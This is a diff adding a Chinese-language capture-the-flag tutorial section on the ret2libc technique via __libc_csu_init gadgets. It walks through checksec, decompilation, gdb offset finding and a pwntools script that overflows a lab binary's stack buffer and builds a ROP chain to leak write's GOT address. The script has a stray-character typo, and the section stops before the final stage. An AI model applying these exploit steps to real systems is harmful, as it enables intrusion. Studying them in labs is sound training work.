@@ -872,3 +872,157 @@ p.sendline(payload)
 p.interactive()
 ```
 
+---
+
+# 6、ret2libc_csuinit
+
+64位文件的传参方式：
+
+- 当参数少于7个时，从左到右放入寄存器rdi、rsi、rdx、rcx、r8、r9
+- 当参数为7个以上时，前面6个一样，后面的依次放入栈中，和32位程序一样
+
+```shell
+fan(a,b,c,d,e,f,g,h)
+a->rdi,b->rsi,c->rdx,d->rcx,e->r8,f->r9
+h->esp
+g->esp
+call fan
+```
+
+
+
+利用原理：64位程序中，函数前六个参数通过寄存器传递，但大多数时候很难找到每一个寄存器对应的gadgets，这时候可以利用x64下的_libc_csu_init中的gadagets。这个函数用来对libc进行初始化操作，而一般的程序都会调用libc，所以这个函数一定会存在
+
+```c
+int func(int arg1,int arg2,int arg3,int arg4,int arg5,int arg6,int arg7,int arg8){
+    int loc1 = arg1 + 1;
+    int loc8 = arg8 + 8;
+    return loc1 + loc8;
+}
+int main(){
+    return func(11,22,33,44,55,66,77,88);
+}
+
+//gcc -m32 stack.c -o stack
+//gcc stack.c -o stack64
+```
+
+![](../pic/6.jpg)
+
+
+
+检查文件，64位程序开启了NX保护
+
+```shell
+# checksec --file=level5 
+[*] '/home/kali/Desktop/level5'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
+```
+
+
+
+拖进IDA反汇编
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  write(1, "Hello, World\n", 0xDuLL);
+  vulnerable_function(1LL);
+  return 0;
+}
+```
+
+
+
+发现一个read栈溢出函数
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
+
+  return read(0, buf, 0x200uLL);
+}
+```
+
+
+
+使用cyclic测栈偏移，利用`x/wx $rsp`以十六进制查看rsp中的值
+
+```shell
+# gdb ./level5
+
+gdb-peda$ r
+                                 
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000400586 in vulnerable_function ()
+
+gdb-peda$ x/wx $rsp
+0x7fffffffe338: 0x6261616a
+
+# cyclic -l 0x6261616a
+136
+
+```
+
+
+
+没有system函数，但是可以利用write函数配合libc泄露出程序加载到内存后的地址，也可以使用_libc_start_main，首先找write在内存中的真实地址
+
+```python
+from pwn import *
+
+p = process('./level5')
+elf = ELF('level5')
+
+pop_addr = 0x40061a          
+write_got = elf.got['write']
+mov_addr = 0x400600
+main_addr = elf.symbols['main']
+
+p.recvuntil('Hello, World\n')
+payload0 = b'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8+8*6) + p64(main_addr)
+p.sendline(payload0)
+
+write_start = u64(p.recv(8))
+print("write_addr_in_memory_is "+hex(write_start))s
+```
+
+
+
+这里的payload0：`b'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8+8*6) + p64(main_addr)`
+
+- 首先输入136个字符A使程序发生栈溢出
+- 然后让pop_addr覆盖栈中的返回地址，使程序返回执行pop_addr地址处的函数
+- 然后将0，1，write_got函数地址，8，write_got，1分别pop到寄存器rbx，rbp，r12，r13，r14，r15中去
+- 然后将pop函数的返回地址覆盖mov_addr的地址为如下：
+
+```shell
+.text:000000000040061A                 pop     rbx  //rbx->0
+.text:000000000040061B                 pop     rbp  //rbp->1
+.text:000000000040061C                 pop     r12  //r12->write_got函数地址
+.text:000000000040061E                 pop     r13  //r13->8
+.text:0000000000400620                 pop     r14  //r14->write_got函数地址
+.text:0000000000400622                 pop     r15  //r15->1
+.text:0000000000400624                 retn         //覆盖为mov_addr
+```
+
+
+
+之后程序转向mov_addr函数，利用mov指令布置寄存器rdx,rsi,edi
+
+```shell
+.text:0000000000400600                 mov     rdx, r13  //rdx==r13==8
+.text:0000000000400603                 mov     rsi, r14  //rsi==r14==write_got函数地址
+.text:0000000000400606                 mov     edi, r15d //edi==r15d==1
+.text:0000000000400609                 call    qword ptr [r12+rbx*8] //call write_got函数地址 
+.text:000000000040060D                 add     rbx, 1
+.text:0000000000400611                 cmp     rbx, rbp //rbx==1,rbp==1
+.text:0000000000400614                 jnz     short loc_400600
+```
